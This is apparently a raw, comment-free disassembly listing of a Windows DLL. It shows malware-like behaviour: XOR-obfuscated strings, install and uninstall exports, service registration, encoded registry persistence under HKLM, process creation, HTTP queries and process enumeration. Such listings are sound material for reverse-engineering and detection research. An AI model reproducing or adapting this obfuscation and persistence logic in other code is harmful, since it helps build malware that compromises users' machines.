test edi edi
je r-xdata
cmp ebp 0x20000
mov eax 0x20000
jg r-xdata
test ebp ebp
jle r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push eax
push ebx
push esi
sub ebp eax
call [ ReadFile@IAT ]
mov eax ebp
test edi edi
jne r-xdata
cmp ebp 0x20000
mov esi 0x20000
jg r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x3c ]
push eax
push esi
push ebx
call sub_100014c0
mov edi eax
test edi edi
je r-xdata
mov esi ebp
mov eax [ esp + 0x14 ]
sub ebp esi
test eax eax
je r-xdata
mov esi [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push esi
push ebx
push edx
call [ WriteFile@IAT ]
mov esi [ esp + 0x10 ]
test edi edi
jne r-xdata
sub_10003520
mov eax [ rw-data ]
sub esp 0xc
push ebx
xor ebx ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
cmp eax ebx
push edi
je r-xdata
xor eax eax
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x2a
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x5
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x15 ] bl
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x28 ]
push ebp
call sub_100013e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov cl [ eax + rw-data ]
xor cl 0x62
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x8
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x18 ] bl
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov cl [ eax + rw-data ]
xor cl 0xdf
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x6
jl r-xdata
lea edx [ esp + 0x10 ]
mov [ rw-data ] eax
push edx
mov [ esp + 0x1a ] bl
call sub_10001fb0
mov eax [ rw-data ]
add esp 0x4
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov [ rw-data ] ebx
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x60
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x5
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x15 ] bl
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_10003680
mov eax [ rw-data ]
sub esp 0x78
test eax eax
push ebx
push ebp
push esi
push edi
jne r-xdata
xor eax eax
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xb1
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x2
jl r-xdata
mov [ esp + 0x12 ] 0x0
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xcd
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x1e ] 0x0
lea edi [ esp + 0x18 ]
jmp r-xdata
mov dl [ eax + rw-data ]
shr dl 0x1
mov [ esp + eax + 0x14 ] dl
inc eax
cmp eax 0x2
jl r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x1e ] 0x0
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x8c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x78
retn
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push edx
push eax
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
lea edi [ esp + 0x44 ]
[ edi ]
mov [ esp + 0x74 ] ax
lea edx [ esp + 0x2c ]
mov ecx [ rw-data ]
lea eax [ esp + 0x44 ]
push edx
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push 0x0
push ecx
push 0x0
mov [ esp + 0x6c ] 0x44
mov [ esp + 0x98 ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x78
retn
push 0x4
push eax
push eax
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
xor eax eax
mov eax [ rw-data ]
push 0xf003f
push eax
push ebx
call [ OpenServiceA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
mov cl [ eax + rw-data ]
xor cl 0xa7
shr cl 0x1
mov [ esp + eax + 0x2c ] cl
inc eax
cmp eax 0x17
jl r-xdata
mov cl [ eax + rw-data ]
xor cl 0xbf
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x21 ] 0x0
lea edi [ esp + 0x18 ]
mov dl [ eax + rw-data ]
xor dl 0xbb
shr dl 0x1
mov [ esp + eax + 0x18 ] dl
inc eax
cmp eax 0x5
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x1d ] 0x0
lea edi [ esp + 0x18 ]
jmp r-xdata
push 0x0
push 0x0
push ebp
call [ StartServiceA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
jne r-xdata
mov [ rw-data ] eax
mov [ esp + 0x43 ] 0x0
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x8c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x2c ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ CloseHandle@IAT ]
call esi
mov ecx [ esp + 0x30 ]
push ecx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x78
retn
xor eax eax
xor eax eax
xor eax eax
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xb1
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x21 ] 0x0
lea edi [ esp + 0x18 ]
mov cl [ eax + rw-data ]
xor cl 0x72
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x5
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x1d ] 0x0
lea edi [ esp + 0x18 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x8b
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x21 ] 0x0
lea edi [ esp + 0x18 ]
mov cl [ eax + rw-data ]
xor cl 0xc
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x11
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x29 ] 0x0
lea edi [ esp + 0x18 ]
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov edi [ esp + 0x90 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebx
call esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi [ esp + 0x90 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x78
retn
sub_100039c0
sub esp 0x40
lea eax [ esp ]
push 0x0
lea ecx [ esp + 0x24 ]
push eax
push ecx
mov ecx [ esp + 0x50 ]
push 0x1
mov [ esp + 0x10 ] 0x20
call sub_10001560
test eax eax
jne r-xdata
xor eax eax
add esp 0x40
retn
mov dl [ eax + rw-data ]
xor dl 0x16
shr dl 0x1
mov [ esp + eax + 0x4 ] dl
inc eax
cmp eax 0x18
jl r-xdata
mov [ rw-data ] eax
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x20 ]
push eax
push ecx
mov [ esp + 0x24 ] 0x0
call _strcmpi
add esp 0x8
neg eax
sbb eax eax
inc eax
add esp 0x40
retn
sub_10003a30
mov eax [ esp + 0x4 ]
mov cx [ eax + 0x2 ]
cmp cx 0xc
jbe r-xdata
cmp cx 0x2
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x8 ] 0x17
jbe r-xdata
xor ecx ecx
mov cx [ eax ]
and ecx 0x80000003
jns r-xdata
mov dx 0x3b
cmp dx [ eax + 0xa ]
sbb eax eax
inc eax
retn
xor eax eax
retn
je r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov cx [ eax + 0x6 ]
cmp cx 0x1c
jbe r-xdata
cmp cx 0x1d
jbe r-xdata
xor eax eax
retn
xor eax eax
retn
sub_10003a90
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
push edi
mov ecx 0x41
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
mov eax [ esp + 0x8 ]
push 0x105
push rw-data
push eax
call [ GetModuleFileNameA@IAT ]
mov eax 0x1
pop edi
retn 0xc
sub_10003af0
sub esp 0x5ac
push ebx
xor ebx ebx
push ebp
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0x104
mov [ esp + 0x14 ] 0x2
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x2c
shr cl 0x1
mov [ esp + eax + 0x80 ] cl
inc eax
cmp eax 0x2f
jl r-xdata
mov ebp [ esp + 0x5b8 ]
mov [ rw-data ] eax
lea edx [ esp + 0x80 ]
push ebp
lea eax [ esp + 0x1b8 ]
push edx
push eax
mov [ esp + 0xbb ] bl
call sprintf
add esp 0xc
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x1b4 ]
push ecx
push 0xf003f
push ebx
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop ebp
pop ebx
add esp 0x5ac
retn
push esi
push edi
mov ecx 0x41
lea edi [ esp + 0xb8 ]
[ edi ]
mov cl [ eax + rw-data ]
xor cl 0xa
shr cl 0x1
mov [ esp + eax + 0x40 ] cl
inc eax
cmp eax 0xe
jl r-xdata
mov esi [ RegQueryValueExA@IAT ]
mov [ rw-data ] eax
lea edx [ esp + 0x14 ]
lea eax [ esp + 0xb8 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x4c ]
push ebx
push edx
push eax
mov [ esp + 0x66 ] bl
call esi
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
pop esi
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x9d
shr cl 0x1
mov [ esp + eax + 0x34 ] cl
inc eax
cmp eax 0xa
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x14 ]
lea eax [ esp + 0xb8 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x40 ]
push ebx
push edx
push eax
mov [ esp + 0x56 ] bl
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx ebx
jbe r-xdata
xor eax eax
mov dl [ esp + eax + 0xb8 ]
sub dl 0x30
xor dl 0xa5
mov [ esp + eax + 0xb8 ] dl
inc eax
cmp eax ecx
jb r-xdata
mov dl [ eax + rw-data ]
xor dl 0x5e
shr dl 0x1
mov [ esp + eax + 0x50 ] dl
inc eax
cmp eax 0xe
jl r-xdata
mov edx [ esp + 0x10 ]
mov esi [ RegSetValueExA@IAT ]
mov [ rw-data ] eax
lea eax [ esp + 0xb8 ]
push ecx
push eax
push 0x3
lea ecx [ esp + 0x5c ]
push ebx
push ecx
push edx
mov [ esp + 0x76 ] bl
call esi
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx ebx
jbe r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov [ esp + 0x14 ] ecx
mov dl [ esp + eax + 0xb8 ]
xor dl 0xa5
add dl 0x30
mov [ esp + eax + 0xb8 ] dl
inc eax
cmp eax ecx
jb r-xdata
mov dl [ eax + rw-data ]
xor dl 0x2e
shr dl 0x1
mov [ esp + eax + 0x28 ] dl
inc eax
cmp eax 0xa
jl r-xdata
mov edx [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x18 ]
push ecx
push rw-data
push eax
lea ecx [ esp + 0x34 ]
push ebx
push ecx
push edx
mov [ esp + 0x4a ] bl
call esi
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x62
shr cl 0x1
mov [ esp + eax + 0x60 ] cl
inc eax
cmp eax 0x24
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x60 ]
push ebp
lea eax [ esp + 0x1c0 ]
push edx
push eax
mov [ esp + 0x90 ] bl
call sprintf
add esp 0xc
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x1bc ]
push ecx
push 0xf003f
push ebx
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + rw-data ]
xor cl 0xc3
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x5
jl r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x1c ]
push 0x4
mov [ rw-data ] eax
push edx
push 0x4
lea eax [ esp + 0x2c ]
push ebx
push eax
push ecx
mov [ esp + 0x3d ] bl
call esi
sub_10003db0
sub esp 0x56c
mov ecx [ esp + 0x570 ]
push ebx
xor ebx ebx
mov [ esp + 0x8 ] 0x104
cmp ecx ebx
mov [ esp + 0x4 ] ebx
je r-xdata
pop ebx
add esp 0x56c
retn
xor eax eax
mov dl [ eax + rw-data ]
xor dl 0x7e
shr dl 0x1
mov [ esp + eax + 0x3c ] dl
inc eax
cmp eax 0x2f
jl r-xdata
mov [ rw-data ] eax
push ecx
lea eax [ esp + 0x40 ]
lea ecx [ esp + 0x174 ]
push eax
push ecx
mov [ esp + 0x77 ] bl
call sprintf
add esp 0xc
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x170 ]
push edx
push 0xf003f
push ebx
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push edi
mov ecx 0x41
lea edi [ esp + 0x70 ]
[ edi ]
pop edi
mov cl [ eax + rw-data ]
xor cl 0xad
shr cl 0x1
mov [ esp + eax + 0x1c ] cl
inc eax
cmp eax 0xe
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x6c ]
push edx
lea ecx [ esp + 0x1c ]
push eax
mov eax [ esp + 0xc ]
push ecx
lea edx [ esp + 0x28 ]
push ebx
push edx
push eax
mov [ esp + 0x42 ] bl
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ esp + 0x8 ]
cmp ecx ebx
jbe r-xdata
xor eax eax
mov dl [ esp + eax + 0x6c ]
xor dl 0xa5
add dl 0x30
mov [ esp + eax + 0x6c ] dl
inc eax
cmp eax ecx
jb r-xdata
mov dl [ eax + rw-data ]
xor dl 0xa7
shr dl 0x1
mov [ esp + eax + 0xc ] dl
inc eax
cmp eax 0xa
jl r-xdata
mov edx [ esp + 0x4 ]
mov [ rw-data ] eax
lea eax [ esp + 0x6c ]
push ecx
push eax
push 0x2
lea ecx [ esp + 0x18 ]
push ebx
push ecx
push edx
mov [ esp + 0x2e ] bl
call [ RegSetValueExA@IAT ]
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xa9
shr cl 0x1
mov [ esp + eax + 0x2c ] cl
inc eax
cmp eax 0xe
jl r-xdata
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
lea edx [ esp + 0x2c ]
mov [ esp + 0x3a ] bl
push edx
push eax
call [ RegDeleteValueA@IAT ]
ServiceMain
mov eax [ esp + 0x8 ]
sub esp 0x104
lea edx [ esp ]
mov ecx [ eax ]
push esi
push 0x104
push ecx
push edx
call wcstombs
add esp 0xc
lea ecx [ esp + 0x4 ]
lea eax [ esp + 0x4 ]
push sub_10004030
push ecx
mov [ rw-data ] eax
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
pop esi
add esp 0x104
retn
push 0x1
push 0x0
push 0x2
call sub_10003fd0
mov esi [ Sleep@IAT ]
add esp 0xc
push 0x3e8
call esi
push 0x0
push 0x0
push 0x4
call sub_10003fd0
add esp 0xc
push 0x0
push 0x0
push 0x0
push sub_10004100
push 0x0
push 0x0
call [ CreateThread@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x1
jne r-xdata
push 0xa
call esi
mov eax [ rw-data ]
cmp eax 0x3
je r-xdata
sub_10003fd0
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x20
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_10004030
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn
jmp [ eax * 4 + jump_table_100040e4 ]
push 0x1
push 0x0
push 0x3
call sub_10003fd0
mov ecx [ rw-data ]
add esp 0xc
mov [ rw-data ] 0x1
push 0x2710
push ecx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
push 0x0
push 0x0
push 0x1
call sub_10003fd0
add esp 0xc
push 0x1
push 0x0
push 0x6
call sub_10003fd0
push 0x0
push 0x0
push 0x7
call sub_10003fd0
add esp 0x18
retn
push 0x1
push 0x0
push 0x5
call sub_10003fd0
push 0x0
push 0x0
push 0x4
call sub_10003fd0
add esp 0x18
retn
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call sub_10003fd0
add esp 0xc
retn
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push 0x1
push edx
call [ TerminateThread@IAT ]
sub_10004100
sub esp 0x5c0
push ebx
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0xc ] ecx
inc ecx
push ecx
call ??2@YAPAXI@Z
mov edx eax
xor ebx ebx
add esp 0x4
cmp edx ebx
mov [ esp + 0x20 ] edx
jne r-xdata
mov eax [ esp + 0xc ]
push ebp
push esi
mov edi edx
lea ecx [ eax + 0x1 ]
xor eax eax
mov esi ecx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x14 ]
xor ecx ecx
cmp eax ebx
jbe r-xdata
pop edi
mov eax 0x1
pop ebx
add esp 0x5c0
retn 0x4
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x41 ]
push eax
push ecx
mov [ esp + 0x1c ] 0x23
mov [ esp + 0x48 ] 0x2f
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov esi rw-data
mov eax edx
sub esi edx
mov dl [ rw-data ]
lea edi [ esp + 0x10 ]
xor dl 0xe9
or ecx 0xffffffff
shr dl 0x1
xor eax eax
mov [ esp + 0x10 ] dl
mov [ esp + 0x11 ] bl
lea edx [ esp + 0x40 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov [ rw-data ] 0x1
and ecx 0x3
[ edi ] [ esi ]
mov [ esp + 0x14 ] ebx
call [ GetLocalTime@IAT ]
mov esi [ Sleep@IAT ]
mov ebp [ RegSetValueExA@IAT ]
mov [ esp + 0x40 ] bl
mov dl [ esi + eax ]
sar dl 0x1
and dl 0x7f
inc ecx
mov [ eax ] dl
mov edx [ esp + 0x14 ]
inc eax
cmp ecx edx
jb r-xdata
pop esi
pop ebp
pop edi
xor eax eax
pop ebx
add esp 0x5c0
retn 0x4
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x85
shr cl 0x1
mov [ esp + eax + 0x64 ] cl
inc eax
cmp eax 0x2f
jl r-xdata
mov edx [ rw-data ]
mov [ rw-data ] eax
lea eax [ esp + 0x64 ]
push edx
lea ecx [ esp + 0x1d4 ]
push eax
push ecx
mov [ esp + 0x9f ] bl
call sprintf
add esp 0xc
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x1d0 ]
push edx
push 0xf003f
push ebx
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov ecx 0x41
lea edi [ esp + 0xcc ]
[ edi ]
mov cl [ eax + rw-data ]
xor cl 0x7a
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x4
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x14 ]
lea eax [ esp + 0xcc ]
push edx
lea ecx [ esp + 0x40 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x2c ]
push ebx
push edx
push eax
mov [ esp + 0x3c ] bl
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push ebx
call esi
xor eax eax
lea ecx [ esp + 0x2c ]
push ecx
call [ GetLocalTime@IAT ]
mov dx [ esp + 0x2e ]
cmp dx [ esp + 0xce ]
ja r-xdata
mov dl [ eax + rw-data ]
xor dl 0x28
shr dl 0x1
mov [ esp + eax + 0x94 ] dl
inc eax
cmp eax 0x37
jl r-xdata
mov edx [ esp + 0x28 ]
mov [ rw-data ] eax
lea eax [ esp + 0x40 ]
push 0x1
lea ecx [ esp + 0x98 ]
push eax
push ecx
push edx
mov [ esp + 0xdb ] bl
call sub_100015d0
mov eax [ rw-data ]
add esp 0x10
cmp eax ebx
je r-xdata
mov ax [ esp + 0x34 ]
cmp ax [ esp + 0xd4 ]
jne r-xdata
mov ax [ esp + 0x32 ]
cmp ax [ esp + 0xd2 ]
jb r-xdata
xor eax eax
push 0xea60
call sub_10004400
add esp 0x4
add eax 0xea60
push eax
call esi
jmp r-xdata
mov cx [ esp + 0x36 ]
cmp cx [ esp + 0xd6 ]
jae r-xdata
mov cx [ esp + 0x34 ]
cmp cx [ esp + 0xd4 ]
jne r-xdata
mov cl [ eax + rw-data ]
xor cl 0x30
shr cl 0x1
mov [ esp + eax + 0x18 ] cl
inc eax
cmp eax 0x4
jl r-xdata
push 0x10
push rw-data
mov [ rw-data ] eax
mov eax [ esp + 0x18 ]
push 0x3
lea edx [ esp + 0x24 ]
push ebx
push edx
push eax
mov [ esp + 0x34 ] bl
call ebp
mov ecx [ esp + 0x10 ]
push ecx
call [ RegCloseKey@IAT ]
jmp r-xdata
mov dx [ esp + 0x36 ]
cmp dx [ esp + 0xd6 ]
jae r-xdata
jmp r-xdata
sub_1000447e
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1000447e
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10003a90
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1000447e
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_1000447e
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10001000
push esi
mov esi ecx
call sub_10001090
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_10001560
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push edx
mov edx [ esp + 0xc ]
push eax
mov eax [ ecx + 0xc ]
push edx
push eax
call [ HttpQueryInfoA@IAT ]
retn 0x10
install
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
cmp [ eax ] 0x0
je r-xdata
push eax
call sub_10003af0
pop ecx
uninstall
mov eax [ esp + 0xc ]
push eax
call sub_10003db0
pop ecx
retn
sub_10004400
push ecx
call rand
mov [ esp ] eax
fild [ esp ]
fimul [ esp + 0x8 ]
fmul [ r--data ]
call _ftol
pop ecx
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sprintf
jmp [ sprintf@IAT ]
sscanf
jmp [ sscanf@IAT ]
_strcmpi
jmp [ _strcmpi@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
atoi
jmp [ atoi@IAT ]
strrchr
jmp [ strrchr@IAT ]
wcstombs
jmp [ wcstombs@IAT ]
rand
jmp [ rand@IAT ]
_ftol
jmp [ _ftol@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_100045d0
lea ecx [ ebp - 0x1f0 ]
jmp sub_10001090
sub_100045db
mov eax r--data
jmp __CxxFrameHandler
sub_100045f0
lea ecx [ ebp - 0x2c4 ]
jmp sub_10001090
sub_100045fb
mov eax r--data
jmp __CxxFrameHandler
